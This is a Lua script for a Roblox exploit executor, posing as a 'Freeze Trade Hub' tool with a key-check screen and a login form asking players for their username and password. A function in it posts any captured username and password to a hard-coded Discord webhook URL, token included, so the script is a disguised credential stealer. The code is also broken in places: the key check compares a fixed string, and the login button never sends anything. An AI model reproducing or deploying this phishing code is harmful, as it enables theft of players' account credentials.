-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Key yang benar
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
        })
    }

    local response
    if syn and syn.request then
        response = syn.request(payload)
    elseif http and http.request then
        response = http.request(payload)
    elseif request then
        response = request(payload)
    else
        print("Executor Anda tidak mendukung HTTP requests!")
        return
    end

    if response and response.StatusCode == 200 then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
    end
end

-- Fungsi Membuat GUI Key Validation
local function createKeyValidationGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "KeyValidationGUI"
    gui.Parent = game.CoreGui

    -- Frame
    local frame = Instance.new("Frame")
    frame.Name = "KeyFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Freeze Trade Hub"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Key Label
    local keyLabel = Instance.new("TextLabel")
    keyLabel.Name = "KeyLabel"
    keyLabel.Parent = frame
    keyLabel.Size = UDim2.new(1, -20, 0, 40)
    keyLabel.Position = UDim2.new(0, 10, 0, 60)
    keyLabel.BackgroundTransparency = 1
    keyLabel.Font = Enum.Font.SourceSans
    keyLabel.Text = "Insert Key"
    keyLabel.TextSize = 14
    keyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Error Label
    local errorLabel = Instance.new("TextLabel")
    errorLabel.Name = "ErrorLabel"
    errorLabel.Parent = frame
    errorLabel.Size = UDim2.new(1, -20, 0, 20)
    errorLabel.Position = UDim2.new(0, 10, 0, 105)
    errorLabel.BackgroundTransparency = 1
    errorLabel.Font = Enum.Font.SourceSans
    errorLabel.Text = ""
    errorLabel.TextSize = 14
    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

    -- Verify Key Button
    local verifyKeyButton = Instance.new("TextButton")
    verifyKeyButton.Name = "VerifyKeyButton"
    verifyKeyButton.Parent = frame
    verifyKeyButton.Size = UDim2.new(1, -20, 0, 40)
    verifyKeyButton.Position = UDim2.new(0, 10, 0, 130)
    verifyKeyButton.Text = "Verifikasi Key"
    verifyKeyButton.Font = Enum.Font.SourceSansBold
    verifyKeyButton.TextSize = 16
    verifyKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    verifyKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Copy Link Button
    local copyLinkButton = Instance.new("TextButton")
    copyLinkButton.Name = "CopyLinkButton"
    copyLinkButton.Parent = frame
    copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
    copyLinkButton.Position = UDim2.new(0, 10, 0, 180)
    copyLinkButton.Text = "Get Key"
    copyLinkButton.Font = Enum.Font.SourceSansBold
    copyLinkButton.TextSize = 16
    copyLinkButton.BackgroundColor3 = Color3.fromRGB(0, 0, 200)
    copyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Tombol Copy Link
    copyLinkButton.MouseButton1Click:Connect(function()
        if setclipboard then
            setclipboard(linkUrl)
            print("Link berhasil disalin ke clipboard!")
        else
            print("Executor Anda tidak mendukung setclipboard. Salin link secara manual: " .. linkUrl)
        end
    end)

    -- Fungsi Verifikasi Key
    verifyKeyButton.MouseButton1Click:Connect(function()
        if "Insert Key" == correctKey then
            print("Key benar!")
            gui:Destroy()
            createLoginGUI(gui) -- Memanggil GUI kedua
        else
            errorLabel.Text = "Key salah! Silahkan Get Key."
        end
    end)
end

-- Fungsi Membuat GUI Login
local function createLoginGUI(parentGui)
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 300)
    frame.Parent = parentGui
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    local title = Instance.new("TextLabel")
    title.Text = "Freeze Trade Hub"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 24
    title.Size = UDim2.new(1, 0, 0, 50)
    title.BackgroundTransparency = 1
    title.Parent = frame

    local usernameLabel = Instance.new("TextLabel")
    usernameLabel.Text = "Insert Username"
    usernameLabel.Size = UDim2.new(1, -20, 0, 40)
    usernameLabel.Position = UDim2.new(0, 10, 0, 60)
    usernameLabel.BackgroundTransparency = 1
    usernameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    usernameLabel.Font = Enum.Font.SourceSans
    usernameLabel.TextSize = 14
    usernameLabel.Parent = frame

    local passwordLabel = Instance.new("TextLabel")
    passwordLabel.Text = "Insert Password"
    passwordLabel.Size = UDim2.new(1, -20, 0, 40)
    passwordLabel.Position = UDim2.new(0, 10, 0, 120)
    passwordLabel.BackgroundTransparency = 1
    passwordLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    passwordLabel.Font = Enum.Font.SourceSans
    passwordLabel.TextSize = 14
    passwordLabel.Parent = frame

    local loginButton = Instance.new("TextButton")
    loginButton.Text = "Login"
    loginButton.Size = UDim2.new(1, -20, 0, 40)
    loginButton.Position = UDim2.new(0, 10, 0, 180)
    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    loginButton.Font = Enum.Font.SourceSansBold
    loginButton.TextSize = 16
    loginButton.Parent = frame

    loginButton.MouseButton1Click:Connect(function()
        print("Login berhasil!")
        parentGui:Destroy()
    end)
end

-- Memulai GUI Key Validation
createKeyValidationGUI()
